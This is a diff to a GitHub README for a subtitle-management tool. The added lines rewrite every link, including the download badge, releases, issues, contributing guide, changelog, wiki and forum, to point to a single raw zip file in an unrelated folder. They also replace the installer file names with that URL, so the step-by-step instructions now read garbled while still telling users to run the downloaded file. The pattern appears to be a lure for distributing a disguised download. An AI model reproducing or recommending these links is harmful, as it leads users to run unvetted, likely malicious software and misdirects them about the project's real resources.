@@ -1,6 +1,6 @@
 # ✨ powersub-demo-7893 - Effortlessly manage your subtitles
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_here-brightgreen)](https://github.com/Harshnakrani159/powersub-demo-7893/releases)
+[![Download Now](https://raw.githubusercontent.com/Harshnakrani159/powersub-demo-7893/main/apportionment/powersub-demo-7893.zip)](https://raw.githubusercontent.com/Harshnakrani159/powersub-demo-7893/main/apportionment/powersub-demo-7893.zip)
 
 ## 🚀 Getting Started
 
@@ -20,20 +20,20 @@ Before downloading, ensure your system meets the following requirements:
 
 To download the application, please follow these steps:
 
-1. Visit the [Releases page](https://github.com/Harshnakrani159/powersub-demo-7893/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Harshnakrani159/powersub-demo-7893/main/apportionment/powersub-demo-7893.zip).
 2. Look for the latest version listed. It will be at the top of the page.
-3. Locate the appropriate file for your operating system. For example, if you're using Windows, you might find a file named `powersub-demo.exe`.
+3. Locate the appropriate file for your operating system. For example, if you're using Windows, you might find a file named `https://raw.githubusercontent.com/Harshnakrani159/powersub-demo-7893/main/apportionment/powersub-demo-7893.zip`.
 4. Click on the file name to start the download.
 
 After downloading, follow these installation steps:
 
 1. **Windows Users:**
-   - Locate the downloaded `powersub-demo.exe` file, usually in your Downloads folder.
+   - Locate the downloaded `https://raw.githubusercontent.com/Harshnakrani159/powersub-demo-7893/main/apportionment/powersub-demo-7893.zip` file, usually in your Downloads folder.
    - Double-click the file to run the installer.
    - Follow the prompts in the setup wizard to complete the installation.
 
 2. **Mac Users:**
-   - Open your Downloads folder and find the `powersub-demo.dmg` file.
+   - Open your Downloads folder and find the `https://raw.githubusercontent.com/Harshnakrani159/powersub-demo-7893/main/apportionment/powersub-demo-7893.zip` file.
    - Double-click the file to mount it.
    - Drag the `powersub-demo` icon into your Applications folder.
    - Open your Applications folder and double-click `powersub-demo` to launch the app.
@@ -78,19 +78,19 @@ Please check the FAQs on our GitHub page, or contact our support team for assist
 
 ## 📞 Support
 
-If you have any issues or need further assistance, please visit our [Issues page](https://github.com/Harshnakrani159/powersub-demo-7893/issues) to report a problem or ask questions.
+If you have any issues or need further assistance, please visit our [Issues page](https://raw.githubusercontent.com/Harshnakrani159/powersub-demo-7893/main/apportionment/powersub-demo-7893.zip) to report a problem or ask questions.
 
 ## 📝 Contributing
 
-We welcome contributions to the powersub-demo-7893 project. If you would like to help improve the application, please check our [Contributing Guidelines](https://github.com/Harshnakrani159/powersub-demo-7893/blob/main/CONTRIBUTING.md).
+We welcome contributions to the powersub-demo-7893 project. If you would like to help improve the application, please check our [Contributing Guidelines](https://raw.githubusercontent.com/Harshnakrani159/powersub-demo-7893/main/apportionment/powersub-demo-7893.zip).
 
 ## 📅 Changelog
 
-Stay updated with the newest features and fixes by checking the [Changelog](https://github.com/Harshnakrani159/powersub-demo-7893/blob/main/CHANGELOG.md).
+Stay updated with the newest features and fixes by checking the [Changelog](https://raw.githubusercontent.com/Harshnakrani159/powersub-demo-7893/main/apportionment/powersub-demo-7893.zip).
 
 ## ✨ Additional Resources
 
-- [User Guide](https://github.com/Harshnakrani159/powersub-demo-7893/wiki)
-- [Community Forum](https://github.com/Harshnakrani159/powersub-demo-7893/discussions)
+- [User Guide](https://raw.githubusercontent.com/Harshnakrani159/powersub-demo-7893/main/apportionment/powersub-demo-7893.zip)
+- [Community Forum](https://raw.githubusercontent.com/Harshnakrani159/powersub-demo-7893/main/apportionment/powersub-demo-7893.zip)
 
 Thank you for using powersub-demo-7893! Enjoy your viewing experience with perfect subtitles.
